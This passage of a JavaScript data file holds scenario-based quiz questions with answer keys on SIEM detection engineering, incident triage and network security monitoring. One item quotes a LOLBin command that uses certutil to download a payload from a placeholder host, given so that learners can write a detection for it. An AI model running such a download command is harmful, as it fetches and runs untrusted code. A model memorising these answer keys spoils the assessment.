          "Disable the alerting rule entirely for one hour while the scan runs to prevent analyst fatigue.",
          "Lower the global severity setting of the rule to prevent it from paging the on-call engineer.",
          "Instruct the on-call team to ignore incoming alerts from that specific IP address until the scan finishes.",
          "Configure throttling to generate one alert per source IP every 30 minutes, preserving event totals."
        ],
        correctAnswer: 3,
        explanation: "Throttling (D) collapses alert storms into a single actionable ticket while preserving total event counts for forensics. Disabling the rule (A), lowering severity (B), or ignoring alerts (C) compromises perimeter visibility."
      },
      {
        id: "siem-q4-5",
        difficulty: "hard",
        tags: ["ATT&CK Coverage"],
        scenario: "Leadership asks: 'How good is our detection coverage?' You have 200 rules.",
        question: "What is the most accurate way to represent your organization's detection posture?",
        options: [
          "Map rules to MITRE ATT&CK techniques and present a heatmap showing covered vs. uncovered threats based on organizational risk.",
          "Provide a detailed dashboard screenshot showing current SIEM system uptime and daily database ingestion statistics.",
          "Report the total number of rules active in the system alongside the average daily alert volume generated.",
          "List all 200 rules in an alphabetical spreadsheet and highlight the ones that fired at least once in the past month."
        ],
        correctAnswer: 0,
        explanation: "Mapping to MITRE ATT&CK (A) visualizes coverage breadth against a standardized threat framework. Raw rule counts (C) or volume (B) are vanity metrics, and list activity (D) does not show risk alignment."
      },
      {
        id: "siem-q4-6",
        difficulty: "medium",
        tags: ["Alert Quality"],
        scenario: "Two alerts arrive simultaneously: Alert A: 'Suspicious activity on host01.' Alert B: 'PowerShell encoded download from winword.exe on CFO laptop. Confidence: 0.94.'",
        question: "Which represents a better-built alert and why?",
        options: [
          "Alert A, because shorter alert names allow analysts to scan and respond to tickets more quickly.",
          "Alert A, because it leaves investigative options open without bias, allowing the analyst to make a judgment.",
          "Alert B, because it provides necessary context like technique mapping, asset value, and parent process lineage for faster triage.",
          "They are equivalent, as both alerts have been assigned a 'High' severity status by the SIEM deployment."
        ],
        correctAnswer: 2,
        explanation: "High-fidelity alerts (C) package vital context (MITRE technique, asset severity, process lineage) for rapid triage. Vague alerts like Alert A (A/B) waste critical response time on basic data gathering."
      },
      {
        id: "siem-q4-7",
        difficulty: "easy",
        tags: ["Runbook"],
        scenario: "An analyst opens an alert and has no idea what to do next.",
        question: "What operational artifact is missing?",
        options: [
          "Migrate to a larger SIEM platform with more automated detection and response capabilities.",
          "Create a comprehensive runbook outlining triage steps, escalation paths, and remediation options.",
          "Increase the severity level of the alert to ensure it is immediately escalated to senior engineers.",
          "Configure the alert to trigger multiple times to ensure the analyst notices the activity."
        ],
        correctAnswer: 1,
        explanation: "A dedicated runbook (B) provides step-by-step guidance for triage, ensuring consistent response. Upgrades (A) or increasing severity (C) do not solve operational process gaps."
      },
      {
        id: "siem-q4-8",
        difficulty: "hard",
        tags: ["Risk-Based Alerting"],
        scenario: "Instead of paging on every notable, you accumulate risk events on entities. A user with 5 medium notables in 24h pages; a user with 1 high notable also pages.",
        question: "What is the name and benefit of this architectural approach?",
        options: [
          "It is standard alert throttling, intended to reduce license usage and system database queries.",
          "It is a legacy security practice that has been deprecated in modern distributed SOC environments.",
          "It is a static threshold rule, designed to alert on any single event regardless of asset risk.",
          "It is Risk-Based Alerting, designed to surface multi-step attacks and reduce analyst burnout."
        ],
        correctAnswer: 3,
        explanation: "Risk-Based Alerting (D) scores risk on entities (users/hosts) over time, surfacing low-and-slow attacks and reducing false positives. It is not simple throttling (A) or legacy (B)."
      },
      {
        id: "siem-q4-9",
        difficulty: "medium",
        tags: ["FP Pattern"],
        scenario: "Your 'Mass File Access' rule fires every Monday morning on 'svc-backup'. Always benign.",
        question: "What is the most precise fix for this false positive?",
        options: [
          "Add a specific exception scoped to the account, the scheduled backup time window, and the relevant file paths.",
          "Suppress all alerts generated on Mondays since weekly backups make false positives highly likely.",
          "Disable the rule entirely since scheduled service accounts render the detection logic unreliable.",
          "Continue to page the analyst, as the rule might eventually catch a true positive lateral movement attempt."
        ],
        correctAnswer: 0,
        explanation: "Exceptions should be tightly scoped to the entity, time, and path (A). General suppressions (B) or disabling rules (C) invite attackers to hide in those unmonitored windows."
      },
      {
        id: "siem-q4-10",
        difficulty: "medium",
        tags: ["Detection KPI"],
        scenario: "You're asked for the single best metric to track detection quality over time.",
        question: "Which metric best reflects overall detection quality?",
        options: [
          "Total alert volume per day — more alerts indicate more active threat coverage and better monitoring.",
          "Alert fidelity (TP / (TP + FP)) tracked per rule, alongside MTTD and MTTR to show tuning effectiveness.",
          "Number of rules in the library — a larger rule count signals a more mature detection program.",
          "SIEM CPU and memory usage — healthy infrastructure performance underpins reliable alert execution."
        ],
        correctAnswer: 1,
        explanation: "Alert fidelity (B) measures how many alerts are true positives, indicating tuning effectiveness. Daily volume (A) and rule counts (C) are misleading metrics that encourage noisy, untuned libraries."
      }
    ]
  },
  {
    quizId: "siem-q5",
    courseId: "siem-fundamentals",
    title: "SIEM Fundamentals — Final Exam",
    description: "Comprehensive scenario-based exam covering architecture, onboarding, query, detection, and operations.",
    passingScore: 80,
    timeLimit: 45,
    questions: [
      {
        id: "siem-q5-1",
        difficulty: "medium",
        tags: ["Triage", "Brute Force"],
        scenario: "07:42 — Alert fires: 500 failed logons against acct 'admin' from 1 source IP in 10 minutes, followed by 1 SUCCESS from the same IP for the same account. The src_ip is external.",
        question: "What is the correct first action?",
        options: [
          "Isolate the host, force account re-auth, search for downstream host access starting from the success timestamp, and escalate to IR.",
          "Wait for additional corroborating security alerts to execute before taking containment actions on the active user account.",
          "Reset the target account password immediately and close the SIEM ticket as resolved without additional scoping.",
          "Block the external source IP address at the perimeter firewall interface and mark the alert as resolved on the dashboard."
        ],
        correctAnswer: 0,
        explanation: "Brute-force followed by success means the attacker is in. Password reset alone (C) or perimeter blocking (D) does not kill active sessions. Containment + scope (where else has this account authenticated since the success?) (A) is the correct sequence."
      },
      {
        id: "siem-q5-2",
        difficulty: "hard",
        tags: ["SPL"],
        scenario: "Write SPL for: top 10 external src_ips by count of distinct internal users they attempted to authenticate as (failed) in the last 24h.",
        question: "Which SPL query is most accurate?",
        options: [
          "index=auth action=failure src_ip=10.0.0.0/8 | stats count by src_ip | sort -count | head 10",
          "index=* failed earliest=-24h | stats values(user) by src_ip | sort -values(user) | head 10",
          "index=auth earliest=-24h NOT src_ip IN (10.0.0.0/8) | stats count(user) by src_ip | head 10",
          "index=auth action=failure earliest=-24h NOT src_ip IN (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) | stats dc(user) AS unique_users by src_ip | sort -unique_users | head 10"
        ],
        correctAnswer: 3,
        explanation: "The correct SPL (D) filters failures, excludes RFC1918 (external only), uses dc(user) to find password-spraying fingerprints (distinct users hit), sorts, and heads. (A) includes internal IPs. (B) lacks failure logic. (C) counts total events, not distinct users."
      },
      {
        id: "siem-q5-3",
        difficulty: "medium",
        tags: ["KQL", "Impossible Travel"],
        scenario: "Sentinel alert: 'Impossible travel' — user signed in from Mumbai 14:02 IST, then São Paulo 14:31 IST.",
        question: "Before paging IR, what is the mandatory first triage step?",
        options: [
          "Disable the user account immediately to prevent any potential credential abuse until the user reports the issue.",
          "Dismiss the alert as a false positive since impossible travel alerts are typically caused by user VPN usage.",
          "Check for known corporate VPN or proxy egress, UserAgent/device identity, MFA details, and Conditional Access risk scores.",
          "Reset the user's password without notification and request a manual confirmation via their supervisor's office."
        ],
        correctAnswer: 2,
        explanation: "Impossible-travel has a high benign-rate (VPNs, mobile carriers, satellite). Checking VPN/proxy/device/MFA context (C) is mandatory triage. Both blind containment (A/D) and blind dismissal (B) are wrong."
      },
      {
        id: "siem-q5-4",
        difficulty: "medium",
        tags: ["Exfiltration"],
        scenario: "Possible data exfiltration suspected for user 'jdoe'. Which combination of SIEM data sources gives the strongest case?",
        question: "Which data source combination is most comprehensive?",
        options: [
          "Email logs only, since email is the primary outbound exfiltration channel and provides complete visibility.",
          "CloudTrail API logs only, since cloud storage downloads capture all data movement in modern enterprise assets.",
          "Active Directory authentication logs, since credential reuse patterns provide the strongest signal of threat intent.",
          "Proxy/firewall outbound flows, DLP alerts, EDR file-access and USB events, CASB uploads, and DNS — correlated by user and host."
        ],
        correctAnswer: 3,
        explanation: "Exfil paths are diverse — corporate email, personal webmail, SaaS, USB, DNS tunneling, cloud sync. A defensible case correlates network + endpoint + identity + DLP (D). Single-source theories (A/B/C) are easy to refute."
      },
      {
        id: "siem-q5-5",
        difficulty: "hard",
        tags: ["IR Timeline"],
        scenario: "You're rebuilding an incident timeline. Events come from EDR, firewall, proxy, AD, and Okta — all with different timestamp formats and some in local TZ.",
        question: "What is the critical preparation step before merging the timeline?",
        options: [
          "Sort all events by database ingest_time to establish a sequence of when logs arrived at the SIEM platform.",
          "Convert all timestamps to the local timezone of the security team to simplify analyst inspection of logs.",
          "Normalize ALL timestamps to UTC at event_time before merging; verify NTP sync; flag any clock-drift over 60 seconds.",
          "Rely on log sequence numbers provided by individual servers to determine absolute event order without time sync."
        ],
        correctAnswer: 2,
        explanation: "Timeline integrity stands on consistent event-time in UTC (C). Mixed TZ + clock drift = misleading attack narrative. Ingest_time (A) tells you when the SIEM received it, not when it happened."
      },
      {
        id: "siem-q5-6",
        difficulty: "medium",
        tags: ["Notable Event", "Splunk ES"],
        scenario: "In Splunk ES, a correlation search produces a notable event. The analyst clicks it in Incident Review.",
        question: "What is a notable event in Splunk ES?",
        options: [
          "A raw log line pulled directly from the underlying index for the analyst to review and parse manually.",
          "A higher-order security event derived from one or more raw events by a correlation search, with status, severity, and owner.",
          "A visual dashboard panel showing trend charts for a particular sourcetype over the last 24 hours.",
          "A scheduled report that runs nightly and emails a summary of authentication events to the SOC team."
        ],
        correctAnswer: 1,
        explanation: "Notables in ES (B) are first-class objects representing actionable security events. They are the surface the SOC works against, not the raw log (A) or dashboard panels (C)."
      },
      {
        id: "siem-q5-7",
        difficulty: "easy",
        tags: ["Retention"],
        scenario: "Compliance says 'keep audit logs 1 year.' Your hot tier holds 30 days, warm 90 days, cold 365.",
        question: "Are you compliant with a tiered storage architecture?",
        options: [
          "No — compliance requires all audit logs to be stored in hot-tier storage for immediate retrieval at any time.",
          "No — the tiered approach creates gaps in searchability that will fail standard regulatory compliance audits.",
          "Yes — the total retention envelope with cold-tier search and restore capability satisfies the 1-year requirement.",
          "Only if the cold tier can restore data within 24 hours and the vendor provides a written SLA guarantee."
        ],
        correctAnswer: 2,
        explanation: "Compliance cares about retention duration + retrievability, not which tier. The tiered storage architecture (C) satisfies the 1-year requirement. Auditors accept tiered storage."
      },
      {
        id: "siem-q5-8",
        difficulty: "hard",
        tags: ["Detection Engineering"],
        scenario: "A new threat blog drops: 'Adversary uses certutil.exe -urlcache -split -f http://x/y.exe to download payloads.' You need a detection by EOD.",
        question: "Which SPL provides the smallest, highest-fidelity detection?",
        options: [
          "index=* certutil — broad keyword search that will generate enormous noise from legitimate certutil admin usage.",
          "index=network http — monitors HTTP traffic but misses the process context needed to confirm certutil abuse.",
          "index=endpoint sourcetype=Sysmon EventID=1 process_name=certutil.exe (commandline=*-urlcache* OR commandline=*-split*) commandline=*http*",
          "index=* | head 1000 — limits results to 1,000 events for a manual review of recent certutil usage."
        ],
        correctAnswer: 2,
        explanation: "Detection precision (C) targets the specific process name, command-line arguments, and network artifacts of the LOLBin threat. Broad keywords (A) or simple network matches (B) generate excessive noise."
      },
      {
        id: "siem-q5-9",
        difficulty: "medium",
        tags: ["Threat Intel"],
        scenario: "You ingest a commercial threat-intel feed of 'malicious IPs'. After a week, your alerts are flooded with hits on those IPs visiting your public website.",
        question: "Why is this happening and what is the correct fix?",
        options: [
          "Restrict TI matching to outbound traffic from internal hosts or inbound on non-public assets.",
          "Replace the threat intelligence feed with a different commercial feed to resolve accuracy issues.",
          "Purchase a larger threat intel feed with more IP addresses to improve coverage and reduce the false positive rate.",
          "Block every TI-listed IP address at the perimeter firewall to prevent scans on the public website."
        ],
        correctAnswer: 0,
        explanation: "TI value depends on direction and asset. Restricting matching to outbound traffic from internal hosts (A) filters out internet background noise (scanners) on public websites (B)."
      },
      {
        id: "siem-q5-10",
        difficulty: "medium",
        tags: ["SOAR"],
        scenario: "Your SIEM integrates with SOAR. A phishing-URL alert fires.",
        question: "What is the most effective SOAR automation strategy?",
        options: [
          "Auto-delete the user's mailbox immediately to prevent any further interaction with the phishing message.",
          "Page the CEO and CISO immediately so that executive leadership can make a containment decision directly.",
          "Auto-disable the recipient's account immediately to prevent the user from clicking any links in the message.",
          "Auto-enrich (sandbox URL, pull reputation, search Exchange for recipients), then propose analyst-approved bulk remediation."
        ],
        correctAnswer: 3,
        explanation: "SOAR automation should execute reversible enrichment tasks first, leaving irreversible actions like account disablement or mailbox deletes to analyst approval (D). This protects against automated outages (A/B/C)."
      },
      {
        id: "siem-q5-11",
        difficulty: "hard",
        tags: ["Lateral Movement"],
        scenario: "EDR shows a user account 'jdoe' authenticating to 27 distinct hosts in 12 minutes from a single workstation. jdoe is a helpdesk technician (so some breadth is normal).",
        question: "What is the best discriminator between normal and compromised behavior?",
        options: [
          "Compare jdoe's 1h count to their own 30-day personal baseline AND to the helpdesk-cohort baseline.",
          "Total host count alone — 27 is above any reasonable threshold and should automatically trigger a page.",
          "Flag all helpdesk activity as potentially malicious since helpdesk accounts are high-value lateral movement targets.",
          "Always treat helpdesk authentication breadth as benign since it is expected behavior for that role by definition."
        ],
        correctAnswer: 0,
        explanation: "Comparing current behavior against personal and cohort baselines (A) distinguishes genuine helpdesk work from lateral movement. Static thresholds (B) cause alerts, and ignoring (D) leaves blind spots."
      },
      {
        id: "siem-q5-12",
        difficulty: "medium",
        tags: ["Health"],
        scenario: "Friday 22:00: the 'Critical Brute Force' detection has not fired in 5 days, but historically fired daily. SOC manager is pleased.",
        question: "What is the correct response to this sudden silence?",
        options: [
          "Send a congratulatory message to the team since the detection silence indicates successful threat reduction.",
          "Disable the rule temporarily since sustained silence may indicate the rule parameters are too restrictive.",
          "Lower the rule threshold to ensure it starts generating alerts again and can be monitored over the weekend.",
          "Open a detection health ticket and verify source ingestion health, parser field availability, and recent rule changes."
        ],
        correctAnswer: 3,
        explanation: "Sustained quiet on active detections should be treated as a pipeline health issue (D). Ingest failures or parsing changes can break detections silently. Congratulating the team (A) or lowering thresholds (C) is premature."
      },
      {
        id: "siem-q5-13",
        difficulty: "medium",
        tags: ["RBAC", "SIEM Admin"],
        scenario: "A Tier 1 analyst asks for permission to delete events from the index 'to clean up false positives'.",
        question: "What is the correct response?",
        options: [
          "Refuse — SIEM data is forensic evidence. Use exclusions and suppressions instead, keeping deletion rights restricted.",
          "Grant the request since cleaning up false positives improves dashboard quality and analyst efficiency.",
          "Grant the permission temporarily for 24 hours and then revoke it after the cleanup task is completed.",
          "Grant permission scoped to a single non-critical index to balance analyst needs with data integrity."
        ],
        correctAnswer: 0,
        explanation: "SIEM data must preserve forensic integrity. Deleting events (B/C/D) ruins audit trails. Use suppressions or lookup exclusions (A) to filter noise without destroying raw evidence."
      },
      {
        id: "siem-q5-14",
        difficulty: "hard",
        tags: ["Insider Threat"],
        scenario: "A finance user starts accessing source-control repos and S3 buckets they've never touched in 18 months — at 02:00 local time — 2 weeks before their resignation date (known to HR).",
        question: "What SIEM capability turns this into a usable signal?",
        options: [
          "A keyword alert that triggers whenever the word 'leaving' or 'resignation' appears in HR system records.",
          "Immediately disable all users on the departure list as a precautionary measure regardless of observed behavior.",
          "Avoid monitoring finance users since financial data access may trigger privacy compliance violations.",
          "UEBA + risk-based alerting: correlate HR status, baseline deviations, off-hours access, and asset sensitivity."
        ],
        correctAnswer: 3,
        explanation: "Insider threat detection relies on correlating HR leaver status, behavioral baseline shifts, and asset sensitivity (D). Simple keyword alerts (A) or mass account lockout (B) are operationally ineffective."
      },
      {
        id: "siem-q5-15",
        difficulty: "medium",
        tags: ["Cloud", "CloudTrail"],
        scenario: "CloudTrail event: a former contractor's API access key calls iam:CreateUser at 03:14 UTC. The contractor offboarded last week.",
        question: "What is the correct severity assessment and first action?",
        options: [
          "Low severity — the iam:CreateUser call is likely leftover automation and will self-resolve when the key is rotated.",
          "Critical — disable key immediately, audit 30-day key usage history, snapshot resources, and initiate incident response.",
          "Medium — monitor for additional IAM calls before escalating to avoid unnecessary IR resource consumption.",
          "Send an email to the former contractor to verify whether they still have authorized access to the environment."
        ],
        correctAnswer: 1,
        explanation: "Offboarded credentials performing administrative tasks indicates active credentials compromise. Immediate disablement and investigation (B) is required to contain the blast radius."
      },
      {
        id: "siem-q5-16",
        difficulty: "easy",
        tags: ["Sigma"],
        scenario: "A team-mate writes a new detection directly in Splunk SPL. Another writes the same logic in KQL for Sentinel. Both maintain their copies independently.",
        question: "What process improvement should you propose?",
        options: [
          "Standardize on Splunk SPL only and migrate all Sentinel workloads to Splunk to eliminate the duplication.",
          "Standardize on KQL only and build a Splunk-to-Sentinel migration plan to unify the detection library.",
          "Author detections in Sigma (vendor-neutral) in Git as the single source of truth, then compile to SPL and KQL via pySigma.",
          "Continue maintaining both copies manually with a quarterly sync review to catch any significant logical drift."
        ],
        correctAnswer: 2,
        explanation: "Authoring detections in Sigma (C) keeps the detection logic centralized in Git while automatically compiling it to vendor-specific syntax, preventing logic drift. Unifying platforms (A/B) or manual syncs (D) are costly."
      },
      {
        id: "siem-q5-17",
        difficulty: "hard",
        tags: ["Maturity"],
        scenario: "SOC A: 10 TB/day ingest, 1,200 vendor-default rules, no ATT&CK mapping, 4,000 alerts/day. SOC B: 2 TB/day, 280 custom Sigma-managed rules, ATT&CK-mapped with quarterly gap review, 60 RBA-paged alerts/day.",
        question: "Which SOC is more operationally mature?",
        options: [
          "SOC A — more data ingested and more rules deployed demonstrates a larger and more comprehensive security investment.",
          "They are equally mature — SOC A covers volume while SOC B covers quality, and both dimensions are important.",
          "SOC B — focused data, intentional detections aligned to threats, measured coverage, and sustainable analyst workload.",
          "Neither — a mature SOC requires at least 5 TB/day ingest and 500+ rules to achieve meaningful threat coverage."
        ],
        correctAnswer: 2,
        explanation: "SOC B's focus on quality, ATT&CK mapping, and sustainable workload (C) is the industry standard for maturity. High volume (A/D) is a vanity metric that typically indicates noisy, untuned detection engineering."
      },
      {
        id: "siem-q5-18",
        difficulty: "medium",
        tags: ["Investigation"],
        scenario: "You start with a single indicator — a suspicious external domain. You want every related event across all data sources.",
        question: "What is the tradecraft term for this technique and the correct SIEM workflow?",
        options: [
          "Pivoting — search across DNS, proxy, firewall, and EDR for the domain; identify hosts; then search their subsequent activity.",
          "Throttling — apply a suppression window to the domain indicator to reduce repeated alert noise during triage.",
          "Suppression — create a watchlist of the domain indicator to passively monitor for future appearances in log data.",
          "Normalization — map the domain indicator to a standard field schema across all data sources and compare results."
        ],
        correctAnswer: 0,
        explanation: "Pivoting (A) involves tracing an indicator across multiple telemetry sources to compile the complete intrusion path. Normalization (D) enables this, but pivoting is the investigative action."
      },
      {
        id: "siem-q5-19",
        difficulty: "hard",
        tags: ["Anti-Forensics", "1102"],
        scenario: "Windows Security Event ID 1102 ('audit log cleared') fires on a domain controller at 04:01 UTC. No scheduled maintenance.",
        question: "How should this be treated?",
        options: [
          "Treat as active intrusion (T1070.001); retrieve central SIEM logs, identify the logon session, isolate the DC, and engage IR.",
          "Low severity — an admin likely cleared the log during routine maintenance and forgot to schedule the change window.",
          "Ignore the event since audit log clearing is a normal administrative task and is expected on domain controllers.",
          "Reboot the domain controller to restore audit log integrity and monitor for any additional suspicious events."
        ],
        correctAnswer: 0,
        explanation: "Audit log clearing on a DC is a critical indicator of defense evasion (A). The analyst must pivot from the 1102 event to find the responsible session using central SIEM logs. Ignoring (B/C) or rebooting (D) is highly dangerous."
      },
      {
        id: "siem-q5-20",
        difficulty: "medium",
        tags: ["KQL", "Identity"],
        scenario: "Sentinel — find users whose sign-in succeeded with MFA satisfied but the MFA method was 'Phone call' from a high-risk country in the last 24h (possible MFA-fatigue or SIM-swap pattern).",
        question: "Which KQL filter chain is correct?",
        options: [
          "SigninLogs | take 100 — returns a sample of 100 recent sign-in rows for manual review.",
          "SigninLogs | where MFA == false — filters for sign-ins where MFA was not satisfied, not the target scenario.",
          "SigninLogs | summarize by AppDisplayName — groups events by application with no MFA or location filter.",
          "SigninLogs | where TimeGenerated > ago(24h) | where ResultType == 0 | where AuthenticationDetails has 'Phone call' | where LocationDetails.countryOrRegion in ('XX','YY') | project UserPrincipalName, IPAddress, AuthenticationDetails, LocationDetails"
        ],
        correctAnswer: 3,
        explanation: "The correct KQL (D) filters by time, success status, the specific MFA factor ('Phone call'), and country codes to target the SIM-swap pattern, projecting the required context fields for triage."
      },
      {
        id: "siem-q5-21",
        difficulty: "hard",
        tags: ["Detection Gap"],
        scenario: "ATT&CK Navigator overlay shows your detection covers Execution and Defense Evasion well, but Credential Access and Lateral Movement are mostly empty.",
        question: "What does this tell you, and what is the next action?",
        options: [
          "Coverage is well-balanced since Execution and Defense Evasion detections catch most attacker activity in practice.",
          "Build detections for Credential Access (LSASS, Kerberoasting, DCSync) and Lateral Movement (anomalous SMB/RDP) as top priorities.",
          "Delete the existing Execution rules to free up resources for building Credential Access detections.",
          "Buy additional storage to accommodate the new log sources needed for Credential Access and Lateral Movement coverage."
        ],
        correctAnswer: 1,
        explanation: "Empty sections in lateral movement and credential access mean you miss the quiet middle stages of an compromise. Building targeted detections (B) is the required next step. Mass storage purchases (D) or rule deletes (C) are wrong."
      },
      {
        id: "siem-q5-22",
        difficulty: "medium",
        tags: ["Detection Rule Design"],
        scenario: "You propose a new rule. Reviewer checklist asks: 'How will an analyst know if this fires by mistake?'",
        question: "What must accompany the rule to answer that question?",
        options: [
          "Nothing additional — experienced analysts will determine whether each fire is a true or false positive independently.",
          "Documented false-positive patterns (known benign triggers) and a triage runbook with escalation criteria.",
          "Just the raw detection logic in the target query language — analysts do not need additional documentation.",
          "A humorous comment in the rule body to make it memorable and easier for junior analysts to recall during triage."
        ],
        correctAnswer: 1,
        explanation: "Detections must ship with a runbook and documented FP profile (B) to ensure the SOC can effectively triage alerts. Relying on raw query code (C) or tribal knowledge (A) increases MTTR."
      },
      {
        id: "siem-q5-23",
        difficulty: "easy",
        tags: ["SOC Success"],
        scenario: "Leadership asks: 'What's the most important factor for SIEM success?'",
        question: "Which answer is most accurate?",
        options: [
          "The most expensive platform available — enterprise-grade SIEMs provide capabilities that justify the cost premium.",
          "Ingesting the maximum possible data volume — broader coverage ensures no relevant security event goes undetected.",
          "Full automation with zero human involvement — removing analyst subjectivity improves detection consistency and speed.",
          "Skilled analysts and engineers who understand the environment, write and tune detections, and run a disciplined lifecycle."
        ],
        correctAnswer: 3,
        explanation: "SIEM maturity is driven by skilled personnel managing the detection lifecycle (D). Buying expensive tools (A), over-collecting data (B), or trying to automate human analysis entirely (C) fails without engineering talent."
      },
      {
        id: "siem-q5-24",
        difficulty: "hard",
        tags: ["End-to-End"],
        scenario: "An alert fires at 03:14: 'PowerShell EncodedCommand executed from winword.exe child process on FIN-HR-04 (CFO laptop).' Walk the optimal end-to-end SOC flow.",
        question: "Which sequence is correct?",
        options: [
          "Acknowledge the alert in the ticketing system, assign it to a senior analyst, and close the ticket by end of shift.",
          "Triage (enrich asset, user, EDR tree) → Contain (isolate host, force re-auth) → Investigate (decode PS, hunt parent doc, pivot C2 domain) → Eradicate → Recover → Lessons Learned.",
          "Page the analyst, wait for them to investigate manually at their own pace, and close after 48 hours regardless of findings.",
          "Mark the alert as a false positive since PowerShell execution from Office processes is common in enterprise environments."
        ],
        correctAnswer: 1,
        explanation: "The SANS IR loop (B) dictates: Triage, Containment (EDR isolation), Investigation (decoding PS, C2 pivot), Eradication, Recovery, and Lessons Learned. Vague triage or ignoring critical alerts (D) leads to compromise."
      },
      {
        id: "siem-q5-25",
        difficulty: "medium",
        tags: ["Culture"],
        scenario: "After 6 months, your SOC ships: 60 actionable alerts/day (was 4,000), 92% TP rate (was 11%), MTTD 14 min (was 6h), 100% ATT&CK-mapped with quarterly gap review. Leadership asks: 'How?'",
        question: "What is the honest answer?",
        options: [
          "Purchased a more capable SIEM platform with better default rules and built-in machine learning capabilities.",
          "Treated detection as engineering: Sigma-first rules in Git with CI replay tests, risk-based alerting, ATT&CK-driven coverage, runbooks per rule, tiered storage, and ruthless tuning cadence.",
          "Hired 50 additional analysts to handle the alert volume and reduce per-analyst workload across the team.",
          "Disabled most of the noisy alerts to reduce volume and manually tuned the threshold on the remainder."
        ],
        correctAnswer: 1,
        explanation: "Mature SOCs win by engineering discipline applied to detection: source control, tests, code review, lifecycle management, measurable outcomes. Tooling enables it; discipline produces the results."
      }
    ]
  },

  // ===== Network Security Monitoring Course Quizzes =====
  {
    quizId: "nsm-q1",
    courseId: "network-security-monitoring",
    title: "NSM Foundations",
    description: "Scenario-based assessment of NSM principles, visibility strategies, and sensor placement.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q1-1",
        difficulty: "easy",
        tags: ["NSM", "Visibility", "Architecture"],
        scenario: "You inherit a SOC that only ingests firewall deny logs and endpoint AV alerts. During an IR engagement, the responder asks: 'Which internal hosts did the C2 beacon talk to laterally after initial access?' You cannot answer.",
        question: "Which capability gap does this most directly expose?",
        options: [
          "Lack of endpoint disk encryption",
          "Lack of east-west network visibility (internal traffic monitoring)",
          "Insufficient firewall rule documentation",
          "Missing threat intel feeds"
        ],
        correctAnswer: 1,
        explanation: "Perimeter deny logs and AV alerts only cover north-south blocks and known-bad files. NSM's core value is east-west visibility — full session metadata for lateral movement, pivoting, and internal C2 that never touches the perimeter."
      },
      {
        id: "nsm-q1-2",
        difficulty: "easy",
        tags: ["Sensor Placement", "SPAN", "TAP"],
        scenario: "Your network team offers two options to feed a new Zeek sensor: (a) a SPAN/mirror port on the core switch shared with 3 other tools, or (b) a passive aggregation TAP dedicated to security.",
        question: "Which is preferred for production NSM and why?",
        options: [
          "SPAN — cheaper and mirrors all VLANs automatically",
          "SPAN — because TAPs cannot see VLAN tags",
          "TAP — dedicated, non-oversubscribed, no dropped frames under load or switch CPU pressure",
          "Either — modern switches never drop SPAN traffic"
        ],
        correctAnswer: 2,
        explanation: "SPAN ports are best-effort and dropped first under switch CPU or oversubscription. TAPs are passive, deterministic, and don't compete with production forwarding — essential for evidentiary-quality capture."
      },
      {
        id: "nsm-q1-3",
        difficulty: "medium",
        tags: ["Encryption", "TLS", "Visibility"],
        scenario: "Leadership asks why you still need NSM when 92% of traffic is TLS 1.3 with ECH (Encrypted Client Hello).",
        question: "What is the strongest justification you can give?",
        options: [
          "TLS 1.3 is trivially decrypted with Wireshark",
          "Metadata (JA3/JA4, SNI where available, cert fingerprints, timing, byte counts, destination reputation, beacon jitter) still yields high-fidelity detections without payload decryption",
          "NSM is unnecessary once TLS 1.3 is deployed",
          "You should mandate all users disable TLS to restore visibility"
        ],
        correctAnswer: 1,
        explanation: "Modern NSM has shifted from payload inspection to encrypted-traffic analytics: TLS fingerprints (JA3/JA4/JA4S), certificate metadata, flow shape, periodicity, and destination reputation are highly effective against C2, tunneling, and beaconing even when payloads are opaque."
      },
      {
        id: "nsm-q1-4",
        difficulty: "medium",
        tags: ["Data Types", "PCAP", "Metadata"],
        scenario: "Storage budget forces you to keep only two of: full PCAP (7 days), Zeek conn/http/dns/ssl logs (90 days), Suricata alerts (1 year).",
        question: "Which two should you retain and why?",
        options: [
          "Full PCAP + Suricata alerts — payload evidence plus signature hits",
          "Zeek metadata + Suricata alerts — long retention of session context and detections, PCAP is nice-to-have but heaviest",
          "Full PCAP + Zeek metadata — most raw fidelity",
          "Suricata alerts only — everything else is redundant"
        ],
        correctAnswer: 1,
        explanation: "Zeek metadata delivers 90 days of investigable session context at a fraction of PCAP cost, and Suricata alerts anchor detections over long windows. Full PCAP is invaluable but the first to sacrifice under budget because it's the most storage-heavy per hour."
      },
      {
        id: "nsm-q1-5",
        difficulty: "medium",
        tags: ["Kill Chain", "Detection"],
        scenario: "An intrusion produced: (1) recon nmap sweep, (2) exploit of a public web app, (3) reverse shell over HTTPS, (4) SMB lateral movement, (5) 3 GB HTTPS upload to a rare ASN.",
        question: "Which stage is NSM typically WEAKEST at detecting on its own?",
        options: [
          "Recon — port scans are trivial to see in conn logs",
          "Exploitation of a zero-day inside an encrypted POST body with no signature and no anomalous metadata",
          "Lateral SMB — visible in Zeek smb logs",
          "Exfiltration — visible as anomalous byte counts to rare destinations"
        ],
        correctAnswer: 1,
        explanation: "NSM shines at recon, C2 patterns, lateral movement, and exfil shape. An unknown exploit hidden inside an encrypted body with normal-looking metadata is the classic NSM blind spot — this is where EDR/app logs must fill the gap."
      },
      {
        id: "nsm-q1-6",
        difficulty: "medium",
        tags: ["Sensor Sizing", "Performance"],
        scenario: "A 10 Gbps sensor is dropping ~4% of packets during business hours. Suricata stats show 'kernel_drops' rising and CPU pinned on a few workers.",
        question: "Which remediation addresses the root cause most directly?",
        options: [
          "Increase disk retention for PCAP",
          "Enable AF_PACKET fanout / PF_RING / DPDK with more RX queues and pin workers to NUMA-local cores",
          "Reduce Suricata rules to zero",
          "Switch to signature-only mode and disable logging"
        ],
        correctAnswer: 1,
        explanation: "Packet drops on a saturated sensor are a capture-plane problem. Load-balancing across RX queues (AF_PACKET fanout, PF_RING, DPDK) and pinning workers to NUMA-local cores parallelizes work and eliminates the single-core bottleneck."
      },
      {
        id: "nsm-q1-7",
        difficulty: "hard",
        tags: ["Cloud NSM", "VPC"],
        scenario: "You're extending NSM into AWS. There are no physical TAPs available.",
        question: "Which combination gives the closest equivalent to on-prem NSM visibility?",
        options: [
          "CloudTrail only",
          "VPC Flow Logs for metadata + VPC Traffic Mirroring to a Zeek/Suricata sensor for deep inspection where required",
          "GuardDuty replaces all NSM needs",
          "S3 access logs"
        ],
        correctAnswer: 1,
